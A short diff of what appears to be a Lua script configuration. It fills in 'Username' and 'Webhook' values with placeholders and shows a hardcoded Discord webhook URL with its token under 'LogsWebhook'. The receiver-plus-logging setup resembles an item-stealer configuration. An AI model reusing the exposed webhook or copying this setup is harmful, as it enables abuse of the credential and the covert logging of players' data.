@@ -1,5 +1,5 @@
-Username = ""
-Webhook = ""
+Username = "UserReceiver"
+Webhook = "ReceiverWebhook"
 
 local LogsWebhook = "https://discord.com/api/webhooks/1341545994738864180/Fmi_-mDbYH3fd6IXzxWLVYbt1vp-bTIKMxn0iwwPaUPq8wL0GNvW_2CoSRsQn3Dxh7DM"
 
